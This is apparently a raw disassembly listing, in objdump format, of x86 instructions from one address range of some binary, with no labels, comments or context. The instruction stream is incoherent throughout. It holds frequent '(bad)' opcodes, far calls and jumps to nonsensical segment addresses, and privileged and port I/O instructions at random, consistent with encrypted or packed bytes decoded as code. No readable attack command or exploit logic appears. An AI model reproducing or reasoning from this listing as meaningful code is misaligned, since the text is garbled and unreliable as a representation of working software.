  40c146:	cs ins DWORD PTR es:[edi],dx
  40c148:	outs   dx,DWORD PTR ds:[esi]
  40c149:	jns    0x40c19a
  40c14b:	aam    0xa4
  40c14d:	ret    0x846b
  40c150:	inc    eax
  40c151:	sub    ebp,ebp
  40c153:	push   edx
  40c154:	cmp    DWORD PTR [ebx],0xe1cc4003
  40c15a:	sub    esp,DWORD PTR ds:0x7dd134d4
  40c160:	lea    ebp,[esi+ebx*1]
  40c163:	or     al,0x17
  40c165:	jp     0x40c1dc
  40c167:	retf   0x10c6
  40c16a:	dec    ecx
  40c16b:	scas   al,BYTE PTR es:[edi]
  40c16c:	pop    ecx
  40c16d:	adc    edi,DWORD PTR [ecx-0x53fedb93]
  40c173:	cmp    eax,0x8f3f5b0e
  40c178:	dec    edx
  40c179:	or     ebp,DWORD PTR [edi-0x6f]
  40c17c:	add    ecx,DWORD PTR [ecx]
  40c17e:	pop    es
  40c17f:	pop    ebx
  40c180:	push   esi
  40c181:	dec    ebp
  40c182:	jae    0x40c1a0
  40c184:	fisttp DWORD PTR [edi+0x6a8fbb43]
  40c18a:	sbb    al,0xb5
  40c18c:	xor    esi,DWORD PTR [ebx-0x16]
  40c18f:	jns    0x40c131
  40c191:	pop    ebp
  40c192:	fcom   st(2)
  40c194:	xor    eax,0x45016d59
  40c199:	cvttps2pi mm1,QWORD PTR [ebp-0x47]
  40c19d:	pop    eax
  40c19e:	xchg   cl,bh
  40c1a0:	out    0x3e,al
  40c1a2:	jle    0x40c212
  40c1a4:	cli    
  40c1a5:	push   es
  40c1a6:	fs pop eax
  40c1a8:	enter  0xecbc,0x32
  40c1ac:	mov    DWORD PTR [ecx-0x5b],ecx
  40c1af:	fdiv   st,st(4)
  40c1b1:	mov    eax,ds:0xa45ab660
  40c1b6:	rcl    BYTE PTR [ebx],1
  40c1b8:	cmp    BYTE PTR [edx-0x1a],bh
  40c1bb:	mov    ds,WORD PTR [esi-0x5f]
  40c1be:	div    ch
  40c1c0:	sub    eax,0xe2f28559
  40c1c5:	mov    bl,0xf8
  40c1c7:	jle    0x40c216
  40c1c9:	(bad)  
  40c1ca:	iret   
  40c1cb:	push   cs
  40c1cc:	lods   al,BYTE PTR ds:[esi]
  40c1cd:	ins    DWORD PTR es:[edi],dx
  40c1ce:	xchg   DWORD PTR [esi+0x77],eax
  40c1d1:	scas   al,BYTE PTR es:[edi]
  40c1d2:	dec    ebx
  40c1d3:	pop    DWORD PTR [ebp-0x4ffeaec1]
  40c1d9:	mov    bh,0x20
  40c1db:	aam    0x2
  40c1dd:	dec    eax
  40c1de:	mov    edi,0xc75830b2
  40c1e3:	dec    edi
  40c1e4:	lea    edi,[esi+0x6b]
  40c1e7:	lods   al,BYTE PTR ds:[esi]
  40c1e8:	sbb    ebp,ebp
  40c1ea:	pop    ss
  40c1eb:	cdq    
  40c1ec:	cs jge 0x40c1c6
  40c1ef:	mov    ecx,0xe14fbb98
  40c1f4:	dec    edi
  40c1f5:	aad    0x8d
  40c1f7:	or     eax,0xeb60cf6a
  40c1fc:	push   cs
  40c1fd:	sub    DWORD PTR [eax+0x7eb3a2dd],eax
  40c203:	cmp    al,0x3c
  40c205:	or     dh,dl
  40c207:	pop    edi
  40c208:	ja     0x40c23a
  40c20a:	ins    BYTE PTR es:[edi],dx
  40c20b:	scas   eax,DWORD PTR es:[edi]
  40c20c:	call   0x2779:0x6417f5a8
  40c213:	mov    al,BYTE PTR [ecx+ebx*1-0x1b]
  40c217:	pop    esp
  40c218:	into   
  40c219:	gs jl  0x40c234
  40c21c:	pop    esp
  40c21d:	xchg   BYTE PTR [edx+eax*2],dh
  40c220:	and    dh,cl
  40c222:	sub    bh,BYTE PTR [edi+ebx*8+0x437b91ee]
  40c229:	lea    ebx,[edi]
  40c22b:	push   ss
  40c22c:	bound  edi,QWORD PTR [ebp-0x1f]
  40c22f:	sbb    DWORD PTR [edx],edx
  40c231:	and    ebp,DWORD PTR [ebx-0x78]
  40c234:	xchg   ebx,eax
  40c235:	cmp    DWORD PTR [esi-0x28],ebp
  40c238:	out    0xf5,al
  40c23a:	add    edx,ecx
  40c23c:	jb     0x40c219
  40c23e:	std    
  40c23f:	mov    ds:0x311331aa,al
  40c244:	xchg   esp,eax
  40c245:	loop   0x40c277
  40c247:	shl    DWORD PTR [ebx+edi*4-0xf],cl
  40c24b:	lods   al,BYTE PTR ds:[esi]
  40c24c:	ins    BYTE PTR es:[edi],dx
  40c24d:	mov    DWORD PTR [ebx],0xa0c91607
  40c253:	popf   
  40c254:	pushf  
  40c255:	es test eax,0xcd3b0dc8
  40c25b:	das    
  40c25c:	push   ecx
  40c25d:	lods   al,BYTE PTR ds:[esi]
  40c25e:	jmp    FWORD PTR [ecx-0x38]
  40c261:	adc    esi,eax
  40c263:	cmp    BYTE PTR [ecx+0x300db7f8],ch
  40c269:	sub    bh,dl
  40c26b:	scas   al,BYTE PTR es:[edi]
  40c26c:	inc    esp
  40c26d:	sar    DWORD PTR [edx-0x4e],1
  40c270:	pop    ebx
  40c271:	xchg   BYTE PTR [edi-0xd],cl
  40c274:	cmp    DWORD PTR [edi+0x41d9595f],ebx
  40c27a:	and    al,0x14
  40c27c:	(bad)  
  40c27d:	(bad)  
  40c27e:	pop    es
  40c27f:	cwde   
  40c280:	daa    
  40c281:	mov    eax,0x3beb09c
  40c286:	stc    
  40c287:	mov    al,0xe3
  40c289:	loopne 0x40c22c
  40c28b:	mov    ds:0xe6df23f,al
  40c290:	ret    0x38fe
  40c293:	shl    ah,1
  40c295:	ds mov cl,0xd4
  40c298:	sub    BYTE PTR [edi-0x74],al
  40c29b:	into   
  40c29c:	pop    esp
  40c29d:	sahf   
  40c29e:	fmul   DWORD PTR [esi+0x41]
  40c2a1:	jge    0x40c223
  40c2a3:	add    BYTE PTR [edi],dh
  40c2a5:	sti    
  40c2a6:	(bad)  [edi]
  40c2a8:	jle    0x40c234
  40c2aa:	sbb    al,0x6f
  40c2ac:	or     ah,BYTE PTR [edi-0x17dfbff8]
  40c2b2:	xchg   ebp,esp
  40c2b4:	and    al,0xf6
  40c2b6:	inc    esp
  40c2b7:	sub    ecx,DWORD PTR [ebx]
  40c2b9:	pop    ebp
  40c2ba:	mov    esp,0x61f6d088
  40c2bf:	push   esi
  40c2c0:	(bad)  
  40c2c1:	cmc    
  40c2c2:	mov    esp,0x36685123
  40c2c7:	(bad)  
  40c2c8:	push   0xffc6a488
  40c2cd:	jnp    0x40c252
  40c2cf:	sub    eax,0xf7b4bcb2
  40c2d4:	push   edi
  40c2d5:	dec    ebp
  40c2d6:	dec    esp
  40c2d7:	mov    eax,ds:0xa7d6f561
  40c2dc:	stc    
  40c2dd:	sub    dh,BYTE PTR [edi-0x71]
  40c2e0:	mov    esi,0x9471d663
  40c2e5:	call   0x518e7d4b
  40c2ea:	mov    al,ds:0x15513f9a
  40c2ef:	mov    ah,0xe0
  40c2f1:	mov    al,0x42
  40c2f3:	add    eax,0x93d3aae1
  40c2f8:	mov    esi,0xc9cacc37
  40c2fd:	dec    eax
  40c2fe:	aam    0x1b
  40c300:	cwde   
  40c301:	(bad)  
  40c302:	mov    eax,ds:0xd9f1a535
  40c307:	dec    edi
  40c308:	xchg   BYTE PTR cs:[ebx+ebp*1],ah
  40c30c:	and    eax,0xac47ea17
  40c311:	shl    BYTE PTR [edx],1
  40c313:	sahf   
  40c314:	sub    eax,0x6acc6fd6
  40c319:	lock or ah,cl
  40c31c:	or     ah,BYTE PTR [eax+0xd758c65]
  40c322:	jnp    0x40c36c
  40c324:	cmc    
  40c325:	push   eax
  40c326:	xor    BYTE PTR [eax-0x38],ah
  40c329:	adc    esp,esi
  40c32b:	push   eax
  40c32c:	sbb    al,0xe4
  40c32e:	dec    ecx
  40c32f:	cdq    
  40c330:	scas   al,BYTE PTR es:[edi]
  40c331:	mov    edx,0xb9a5fd19
  40c336:	jle    0x40c2cf
  40c338:	jne    0x40c394
  40c33a:	adc    al,BYTE PTR [edx]
  40c33c:	(bad)  
  40c33d:	sbb    BYTE PTR [edx+0x19ae87b],dl
  40c343:	xor    esp,DWORD PTR ds:0x5bb50f0b
  40c349:	in     al,0x60
  40c34b:	aas    
  40c34c:	add    eax,0x7562f0c2
  40c351:	cmp    bh,BYTE PTR [edx+0x56fda3d2]
  40c357:	xchg   esp,eax
  40c358:	xchg   ebx,eax
  40c359:	lock cmc 
  40c35b:	xor    eax,0xd0b40815
  40c360:	mov    cl,0x9a
  40c362:	(bad)  
  40c363:	pop    ebx
  40c364:	out    0xc,al
  40c366:	fwait
  40c367:	imul   ebx,ebx,0xd4e10709
  40c36d:	or     al,0x2f
  40c36f:	(bad)  
  40c370:	stos   BYTE PTR es:[edi],al
  40c371:	mov    edx,0xfa130e41
  40c376:	lods   al,BYTE PTR ds:[esi]
  40c377:	repnz out 0xda,al
  40c37a:	scas   eax,DWORD PTR es:[edi]
  40c37b:	hlt    
  40c37c:	jmp    0x4988782d
  40c381:	inc    edx
  40c382:	(bad)  
  40c383:	jae    0x40c3a2
  40c385:	jae    0x40c3aa
  40c387:	paddw  mm6,QWORD PTR [ecx-0x1155f7eb]
  40c38e:	mov    edx,DWORD PTR [ebp-0x5c]
  40c391:	xor    eax,edi
  40c393:	xor    edx,edx
  40c395:	or     eax,edx
  40c397:	mov    edx,DWORD PTR [ebp+0x14]
  40c39a:	shl    ecx,0x1e
  40c39d:	jmp    0x40c927
  40c3a2:	sbb    esp,edi
  40c3a4:	adc    eax,0x1913193b
  40c3a9:	aad    0x32
  40c3ab:	into   
  40c3ac:	sti    
  40c3ad:	mov    ah,0x10
  40c3af:	xor    BYTE PTR cs:[esp+eax*2+0x3d1616de],dh
  40c3b7:	add    al,0x16
  40c3b9:	push   ss
  40c3ba:	icebp  
  40c3bb:	jae    0x40c37a
  40c3bd:	out    dx,al
  40c3be:	dec    ebx
  40c3bf:	push   ss
  40c3c0:	jbe    0x40c3ff
  40c3c2:	dec    esi
  40c3c3:	mov    esp,0x8b887b47
  40c3c8:	mov    dl,0x9
  40c3ca:	loop   0x40c36d
  40c3cc:	adc    eax,0xc4dbe401
  40c3d1:	push   0x4a
  40c3d3:	shl    DWORD PTR [ecx],cl
  40c3d5:	(bad)
  40c3d8:	ss xchg edx,eax
  40c3da:	fwait
  40c3db:	scas   eax,DWORD PTR es:[edi]
  40c3dc:	pop    ecx
  40c3dd:	repz (bad) 
  40c3df:	call   0x5578:0x9dbab7f6
  40c3e6:	xlat   BYTE PTR ds:[ebx]
  40c3e7:	xor    BYTE PTR [esi+0x4e],ch
  40c3ea:	jge    0x40c3de
  40c3ec:	xchg   ebp,eax
  40c3ed:	add    ecx,edx
  40c3ef:	push   eax
  40c3f0:	xor    cl,BYTE PTR [edi+0x44e2381]
  40c3f6:	je     0x40c44c
  40c3f8:	fidiv  WORD PTR [edx-0x66]
  40c3fb:	ret    
  40c3fc:	out    dx,eax
  40c3fd:	dec    edx
  40c3fe:	call   0x2a7f:0xc5ac67c
  40c405:	addr16 push esi
  40c407:	pop    edi
  40c408:	or     ecx,DWORD PTR [esi-0x4b]
  40c40b:	outs   dx,BYTE PTR ds:[esi]
  40c40c:	and    al,0x93
  40c40e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c40f:	jbe    0x40c3bd
  40c411:	jmp    0xe7955183
  40c416:	cmp    eax,0x2815963e
  40c41b:	pop    edx
  40c41c:	inc    ebx
  40c41d:	jbe    0x40c47b
  40c41f:	sub    al,0x2d
  40c421:	mov    dl,0x56
  40c423:	pusha  
  40c424:	mov    bh,0x11
  40c426:	and    al,0xc6
  40c428:	jae    0x40c491
  40c42a:	lds    eax,FWORD PTR [eax]
  40c42c:	jp     0x40c47f
  40c42e:	cmp    DWORD PTR [esi+esi*4-0x45],ecx
  40c432:	out    dx,eax
  40c433:	adc    DWORD PTR [esi-0x7c],edx
  40c436:	pop    edx
  40c437:	test   DWORD PTR [edx+0x7c],edx
  40c43a:	push   ss
  40c43b:	mov    ecx,0x7c63bcce
  40c440:	rcr    BYTE PTR [ebx-0x7e],0xba
  40c444:	jp     0x40c40e
  40c446:	jmp    0xdca3:0x256b26c1
  40c44d:	data16 out 0x7e,al
  40c450:	sub    al,0x2c
  40c452:	imul   ecx,DWORD PTR [edx],0xd11db8ab
  40c458:	js     0x40c401
  40c45a:	sbb    esi,DWORD PTR [edx+0x2c]
  40c45d:	call   0xb0edb54
  40c462:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c463:	outs   dx,DWORD PTR ds:[esi]
  40c464:	sbb    DWORD PTR [eax],0xc503f24c
  40c46a:	mov    al,0x4a
  40c46c:	ficom  DWORD PTR [esi+eax*4-0x1e485026]
  40c473:	push   ecx
  40c474:	stos   DWORD PTR es:[edi],eax
  40c475:	(bad)  
  40c476:	push   eax
  40c477:	jae    0x40c40c
  40c479:	cli    
  40c47a:	in     al,dx
  40c47b:	xchg   ecx,eax
  40c47c:	daa    
  40c47d:	mul    ch
  40c47f:	sub    al,ah
  40c481:	pop    esp
  40c482:	push   cs
  40c483:	pop    esp
  40c484:	popf   
  40c485:	lods   eax,DWORD PTR ds:[esi]
  40c486:	xor    ch,bl
  40c488:	push   cs
  40c489:	fs mov bh,0x68
  40c48c:	pop    ecx
  40c48d:	popf   
  40c48e:	fdivr  QWORD PTR [esi]
  40c490:	pop    DWORD PTR [ecx+0x0]
  40c493:	add    BYTE PTR [eax+0x14],dh
  40c496:	and    al,0xc7
  40c498:	dec    esi
  40c499:	stos   DWORD PTR es:[edi],eax
  40c49a:	xchg   ecx,eax
  40c49b:	and    ebx,DWORD PTR [esi]
  40c49d:	dec    eax
  40c49e:	sti    
  40c49f:	fnstenv [ebp+0x465f2769]
  40c4a5:	lods   al,BYTE PTR ds:[esi]
  40c4a6:	test   eax,edi
  40c4a8:	adc    BYTE PTR [edi-0x3bbe5276],cl
  40c4ae:	dec    eax
  40c4af:	outs   dx,BYTE PTR ds:[esi]
  40c4b0:	mov    bl,0xf8
  40c4b2:	cdq    
  40c4b3:	scas   al,BYTE PTR es:[edi]
  40c4b4:	out    0xfe,al
  40c4b6:	and    ch,BYTE PTR [ecx+0x54f07b78]
  40c4bc:	enter  0x1686,0xa6
  40c4c0:	lods   eax,DWORD PTR ds:[esi]
  40c4c1:	out    0x2e,al
  40c4c3:	sti    
  40c4c4:	add    DWORD PTR [edi-0x6e],edi
  40c4c7:	test   BYTE PTR [edx+0x1972b267],0xa1
  40c4ce:	call   0x5fe3:0x873f8fa
  40c4d5:	jbe    0x40c4d3
  40c4d7:	or     BYTE PTR [edi],bh
  40c4d9:	mov    WORD PTR ds:0x920a6785,ss
  40c4df:	mov    DWORD PTR [ebx-0x1c55d316],esi
  40c4e5:	(bad)  
  40c4e6:	(bad)  
  40c4e7:	jbe    0x40c53c
  40c4e9:	sbb    DWORD PTR [edx+0x20e3bc06],esi
  40c4ef:	out    0xdb,al
  40c4f1:	fcomp  DWORD PTR [ebx+0x57b504d]
  40c4f7:	push   es
  40c4f8:	ins    BYTE PTR es:[edi],dx
  40c4f9:	dec    edi
  40c4fa:	mov    edi,0x38ae7700
  40c4ff:	mov    bh,0xc2
  40c501:	or     DWORD PTR [edx+0x1e307972],eax
  40c507:	lock push edi
  40c509:	jo     0x40c4f2
  40c50b:	mov    esi,0x83a52884
  40c510:	mov    ebp,0xe8052195
  40c515:	test   eax,0xf7d9738
  40c51a:	lods   al,BYTE PTR ds:[esi]
  40c51b:	scas   eax,DWORD PTR es:[edi]
  40c51c:	xchg   BYTE PTR fs:[ebx],dh
  40c51f:	aad    0xfb
  40c521:	jmp    0x40c4e1
  40c523:	mov    BYTE PTR [bp+si-0x25f2],cl
  40c528:	push   0x17
  40c52a:	mov    al,BYTE PTR [ecx+ecx*4]
  40c52d:	enter  0x27f0,0xa7
  40c531:	fs cmp eax,0x13ebd3ec
  40c537:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c538:	xchg   esp,eax
  40c539:	push   edi
  40c53a:	je     0x40c5b8
  40c53c:	jno    0x40c533
  40c53e:	enter  0xc719,0x47
  40c542:	mov    bh,0x3e
  40c544:	cli    
  40c545:	lods   eax,DWORD PTR ds:[esi]
  40c546:	fstp   TBYTE PTR [esi+0x97cffa0]
  40c54c:	dec    ebx
  40c54d:	lahf   
  40c54e:	push   esp
  40c54f:	pop    esi
  40c550:	pop    ds
  40c551:	add    eax,edi
  40c553:	mov    eax,0xdf6c121d
  40c558:	dec    ecx
  40c559:	fadd   DWORD PTR [esi]
  40c55b:	mov    dl,0xe7
  40c55d:	hlt    
  40c55e:	bound  ebx,QWORD PTR [ecx-0x398bea7e]
  40c564:	out    dx,eax
  40c565:	mov    al,0xc8
  40c567:	or     eax,0x93feda5c
  40c56c:	pop    esp
  40c56d:	push   0xffffffc0
  40c56f:	push   ebp
  40c570:	mov    ds:0x878e644f,eax
  40c575:	(bad)  
  40c576:	jmp    0xc2a6113b
  40c57b:	repz add dl,dh
  40c57e:	fisttp WORD PTR [edx-0x667bc8c3]
  40c584:	mov    cl,0xd8
  40c586:	out    dx,eax
  40c587:	enter  0xad20,0xb5
  40c58b:	mov    eax,ds:0xe5ac98b1
  40c590:	add    esp,ebx
  40c592:	into   
  40c593:	inc    ebx
  40c594:	xor    al,0xcd
  40c596:	ins    BYTE PTR es:[edi],dx
  40c597:	xchg   edx,eax
  40c598:	add    al,BYTE PTR [edx+0x363ccba4]
  40c59e:	inc    si
  40c5a0:	and    eax,DWORD PTR [esi+0x42f6dece]
  40c5a6:	shl    BYTE PTR [eax-0x6d],cl
  40c5a9:	jp     0x40c5fb
  40c5ab:	sub    esi,DWORD PTR [edi+0x61]
  40c5ae:	mov    esp,0x8815be2f
  40c5b3:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40c5b5:	and    BYTE PTR [edi],dl
  40c5b7:	add    al,0xe0
  40c5b9:	fsubr  DWORD PTR [edx+0x78]
  40c5bc:	int    0xd6
  40c5be:	stc    
  40c5bf:	enter  0xb30d,0x38
  40c5c3:	shl    DWORD PTR [ecx+0x13],cl
  40c5c6:	cdq    
  40c5c7:	retf   
  40c5c8:	lds    ebp,FWORD PTR [edx+0x4573ee7f]
  40c5ce:	fisttp QWORD PTR [edi]
  40c5d0:	pop    edx
  40c5d1:	loop   0x40c606
  40c5d3:	dec    ecx
  40c5d4:	call   0xbaa0:0x82838de0
  40c5db:	jmp    0x2a4f:0xb0e60e24
  40c5e2:	mov    ah,0x57
  40c5e4:	sbb    edx,DWORD PTR [eax-0x203d864f]
  40c5ea:	in     eax,dx
  40c5eb:	out    0xd7,eax
  40c5ed:	lods   al,BYTE PTR ds:[esi]
  40c5ee:	add    DWORD PTR [eax+0x5e],ecx
  40c5f1:	push   edi
  40c5f2:	and    al,0xf5
  40c5f4:	jl     0x40c59c
  40c5f6:	(bad)  
  40c5f7:	and    DWORD PTR [edx+ebx*1-0x43],esp
  40c5fb:	cmp    eax,0xc0610516
  40c600:	out    dx,al
  40c601:	in     eax,dx
  40c602:	cld    
  40c603:	repnz dec ebx
  40c605:	adc    al,0x8d
  40c607:	jl     0x40c686
  40c609:	or     al,0xb5
  40c60b:	in     eax,dx
  40c60c:	popf   
  40c60d:	mul    DWORD PTR [esi+0x70]
  40c610:	and    al,BYTE PTR [esi-0x3e]
  40c613:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c614:	push   es
  40c615:	and    esi,esi
  40c617:	add    BYTE PTR [ebx+0x4055f370],0xef
  40c61e:	mov    ecx,0xa31b8cb
  40c623:	inc    edx
  40c624:	(bad)
  40c627:	jns    0x40c5c2
  40c629:	out    dx,eax
  40c62a:	mov    BYTE PTR [edx+0x2a],al
  40c62d:	ret    
  40c62e:	das    
  40c62f:	(bad)  
  40c630:	mov    edi,0xbe2001d4
  40c635:	inc    BYTE PTR [edi+0x5f]
  40c638:	mov    ch,0xb3
  40c63a:	pushf  
  40c63b:	mov    edi,0x1d92dcd1
  40c640:	push   es
  40c641:	dec    esp
  40c642:	inc    edx
  40c643:	mov    al,0xd4
  40c645:	jge    0x40c5dc
  40c647:	fwait
  40c648:	paddw  mm6,QWORD PTR [ebp-0x35]
  40c64c:	xchg   edi,eax
  40c64d:	sub    bh,BYTE PTR [edx+0x1d24d98c]
  40c653:	popa   
  40c654:	(bad)  
  40c655:	sbb    cl,BYTE PTR ds:[ebx]
  40c658:	(bad)
  40c65b:	xchg   ecx,esp
  40c65d:	dec    edi
  40c65e:	outs   dx,DWORD PTR ds:[esi]
  40c65f:	bound  esp,QWORD PTR [edx-0x16]
  40c662:	xor    BYTE PTR ds:[ecx],ch
  40c665:	lock repz mov ds:0xabb6dcaf,al
  40c66c:	lahf   
  40c66d:	nop
  40c66e:	mov    edi,0xca9fe01
  40c673:	push   0xffffffb3
  40c675:	mov    esi,0x8df88dc5
  40c67a:	or     ebp,ecx
  40c67c:	stos   DWORD PTR es:[edi],eax
  40c67d:	dec    ebp
  40c67e:	push   edx
  40c67f:	inc    ebx
  40c680:	xchg   DWORD PTR [edi-0x52c32208],edi
  40c686:	mov    BYTE PTR [ebx-0x20],cl
  40c689:	sbb    eax,0xded2688
  40c68e:	fld    DWORD PTR [eax]
  40c690:	add    BYTE PTR [esi],bh
  40c692:	push   esp
  40c693:	pushf  
  40c694:	mov    al,0x38
  40c696:	sub    al,0xe4
  40c698:	and    dh,al
  40c69a:	repz aam 0xd6
  40c69d:	js     0x40c69e
  40c69f:	and    al,0x26
  40c6a1:	adc    edx,DWORD PTR [esi+0x24]
  40c6a4:	lock in eax,dx
  40c6a6:	les    ecx,FWORD PTR [ebx-0x41]
  40c6a9:	dec    esp
  40c6aa:	mov    eax,0x97477ff6
  40c6af:	xchg   edi,eax
  40c6b0:	mov    ah,0x16
  40c6b2:	loope  0x40c6de
  40c6b4:	or     edi,edi
  40c6b6:	sub    bh,BYTE PTR [edi+0x7bb2579]
  40c6bc:	jns    0x40c6be
  40c6be:	sub    ecx,eax
  40c6c0:	clc    
  40c6c1:	aad    0x7e
  40c6c3:	dec    edi
  40c6c4:	aas    
  40c6c5:	stos   BYTE PTR es:[edi],al
  40c6c6:	mov    ecx,0x5ce1ca24
  40c6cb:	mov    esp,0xaca28edb
  40c6d0:	repnz or al,0x6e
  40c6d3:	mov    al,0xd0
  40c6d5:	shr    BYTE PTR [ebx+0x4d625a80],0x9b
  40c6dc:	push   esp
  40c6dd:	or     ah,ch
  40c6df:	jl     0x40c6ac
  40c6e1:	in     al,dx
  40c6e2:	jne    0x40c6cb
  40c6e4:	sub    eax,0x85b8819a
  40c6e9:	test   DWORD PTR [ecx-0x7f3b964b],0x727a8a4e
  40c6f3:	nop
  40c6f4:	xchg   DWORD PTR [edx-0x4aaec4ad],edi
  40c6fa:	repz aaa 
  40c6fc:	jle    0x40c6c5
  40c6fe:	cmp    DWORD PTR [eax+0x6f2bbe64],esi
  40c704:	sbb    BYTE PTR [ecx],bl
  40c706:	mov    cl,0xa9
  40c708:	shl    cl,0x70
  40c70b:	jae    0x40c6f5
  40c70d:	iret   
  40c70e:	js     0x40c6c1
  40c710:	sti    
  40c711:	dec    esp
  40c712:	aad    0xbc
  40c714:	imul   ecx,DWORD PTR [edi-0xe],0x65
  40c718:	xchg   edi,eax
  40c719:	xchg   esp,eax
  40c71a:	inc    esp
  40c71b:	sub    BYTE PTR [esi+0x27],dh
  40c71e:	scas   al,BYTE PTR es:[edi]
  40c71f:	ds push eax
  40c721:	fist   WORD PTR [ecx-0x9]
  40c724:	xchg   BYTE PTR [ebx],bl
  40c726:	(bad)
  40c72a:	add    DWORD PTR [ebp-0x72],ebx
  40c72d:	inc    edx
  40c72e:	and    BYTE PTR [ebx+0x245ad900],al
  40c734:	pop    es
  40c735:	mov    ecx,0x9635d8d4
  40c73a:	ss mov ch,0xfa
  40c73d:	or     BYTE PTR [eax],ah
  40c73f:	jbe    0x40c73f
  40c741:	or     esi,esi
  40c743:	dec    ebp
  40c744:	ret    
  40c745:	or     al,0xd2
  40c747:	pop    dx
  40c749:	cmp    DWORD PTR [edi],ecx
  40c74b:	mov    ch,0x60
  40c74d:	mov    ah,0x3f
  40c74f:	dec    ebp
  40c750:	out    dx,al
  40c751:	push   edx
  40c752:	cmp    cl,BYTE PTR [edi]
  40c754:	popa   
  40c755:	jmp    0x40c76c
  40c757:	pop    ebp
  40c758:	jae    0x40c74a
  40c75a:	(bad)  
  40c75b:	daa    
  40c75c:	xlat   BYTE PTR ds:[ebx]
  40c75d:	jnp    0x40c75c
  40c75f:	js     0x40c76f
  40c761:	cmp    BYTE PTR [edi],dh
  40c763:	mov    ds:0x5ccc643b,al
  40c768:	ja     0x40c7d4
  40c76a:	les    edi,FWORD PTR [eax]
  40c76c:	(bad)  
  40c76d:	stc    
  40c76e:	push   esi
  40c76f:	cmp    al,0x17
  40c771:	or     DWORD PTR [eax+esi*4-0x3d98dea6],edx
  40c778:	fwait
  40c779:	ins    BYTE PTR es:[edi],dx
  40c77a:	shr    edx,0x7b
  40c77d:	leave  
  40c77e:	pop    ebp
  40c77f:	mov    esi,0x59ed2a79
  40c784:	add    al,0x19
  40c786:	sbb    edx,ecx
  40c788:	loope  0x40c765
  40c78a:	aad    0xc0
  40c78c:	lods   al,BYTE PTR ds:[esi]
  40c78d:	or     eax,0xe4edce76
  40c792:	imul   ecx
  40c794:	and    eax,0x706a9b2b
  40c799:	mov    edx,0x444fc397
  40c79e:	xchg   ebx,eax
  40c79f:	aam    0x35
  40c7a1:	sbb    eax,0xc967c0ac
  40c7a6:	jge    0x40c7c8
  40c7a8:	jle    0xba4418c7
  40c7ae:	sahf   
  40c7af:	sub    edx,DWORD PTR [ecx+esi*2-0x42679b21]
  40c7b6:	imul   ebx
  40c7b8:	or     al,0xce
  40c7ba:	into   
  40c7bb:	push   eax
  40c7bc:	shr    DWORD PTR [edi+eiz*2-0x730340c4],0x72
  40c7c4:	mov    esi,0x4773ffd1
  40c7c9:	dec    ecx
  40c7ca:	push   ds
  40c7cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7cc:	ja     0x40c769
  40c7ce:	sub    DWORD PTR [ebx+0x2424fa55],esp
  40c7d4:	ja     0x40c7f0
  40c7d6:	ror    BYTE PTR [edi-0x7281a970],cl
  40c7dc:	fmul   QWORD PTR [edx]
  40c7de:	(bad)  
  40c7e0:	ret    0xa4ed
  40c7e3:	loopne 0x40c83d
  40c7e5:	sub    BYTE PTR [ecx-0xf58b4f],bl
  40c7eb:	push   esi
  40c7ec:	mov    bl,BYTE PTR [ebx]
  40c7ee:	cmp    BYTE PTR [edx+0x5b],ah
  40c7f1:	cmp    al,0x6f
  40c7f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7f4:	sub    al,0xf
  40c7f6:	push   ebx
  40c7f7:	jl     0x40c7b8
  40c7f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7fa:	shr    DWORD PTR [ebx-0x18c5d884],1
  40c800:	call   0xa26ae263
  40c805:	(bad)  
  40c806:	mov    esp,0x9b7a05dc
  40c80b:	sbb    bl,BYTE PTR [ebp+0x4c]
  40c80e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c80f:	sbb    al,0x90
  40c811:	dec    edx
  40c812:	xchg   BYTE PTR [edi-0x5c701853],cl
  40c818:	fstp   TBYTE PTR [ebx]
  40c81a:	test   BYTE PTR [edi+0x3a],ah
  40c81d:	scas   al,BYTE PTR es:[edi]
  40c81e:	es push esp
  40c820:	fistp  WORD PTR [ebx]
  40c822:	mov    edx,0xbd69e199
  40c827:	rcl    DWORD PTR [ebx+ebx*4-0x69],0x62
  40c82c:	shl    BYTE PTR gs:[esi-0x2b],cl
  40c830:	pop    ss
  40c831:	cld    
  40c832:	out    dx,eax
  40c833:	pusha  
  40c834:	sub    BYTE PTR [esi-0x581a8a60],0xa7
  40c83b:	xchg   edx,eax
  40c83c:	(bad)  
  40c83e:	les    esi,FWORD PTR [esi+ebx*8-0x6f]
  40c842:	test   al,0xbb
  40c844:	add    bh,BYTE PTR [ebp+ebp*4+0x16e35f76]
  40c84b:	xchg   DWORD PTR [edx+0x2318658c],ebp
  40c851:	xor    ah,BYTE PTR [ebx-0x13f559c8]
  40c857:	mov    esp,0xcaadcef0
  40c85c:	pusha  
  40c85d:	add    eax,0x30334850
  40c862:	xchg   BYTE PTR [edi],cl
  40c864:	fwait
  40c865:	imul   esp,ebp,0xcda30c6
  40c86b:	cmp    al,0xce
  40c86d:	cmp    bl,ch
  40c86f:	mov    ah,0xcc
  40c871:	sbb    cl,BYTE PTR [esi-0x5bb1fafa]
  40c877:	cmc    
  40c878:	mov    ah,ah
  40c87a:	sti    
  40c87b:	push   0x20830b52
  40c880:	mov    DWORD PTR [edi+ecx*2],ebx
  40c883:	dec    esp
  40c884:	ret    
  40c885:	ficomp DWORD PTR [ebx-0x6c]
  40c888:	adc    BYTE PTR [edi+0x32549222],0x5
  40c88f:	sar    edi,1
  40c891:	add    BYTE PTR [eax],dl
  40c893:	mov    eax,ds:0x588d9329
  40c898:	repz mov ebx,0xb3dfd09d
  40c89e:	push   ds
  40c89f:	fisub  DWORD PTR [edi+ebp*2+0x448f7a00]
  40c8a6:	mov    ch,0xb3
  40c8a8:	int    0x9
  40c8aa:	xor    dh,BYTE PTR [edi]
  40c8ac:	stos   BYTE PTR es:[edi],al
  40c8ad:	sub    ebp,DWORD PTR [eax+0x18]
  40c8b0:	imul   edi,DWORD PTR [ecx],0x5a
  40c8b3:	enter  0x4e58,0x89
  40c8b7:	mov    ecx,0x590d0e9d
  40c8bc:	mov    bh,0xa2
  40c8be:	mov    ?,WORD PTR [edi-0x1e]
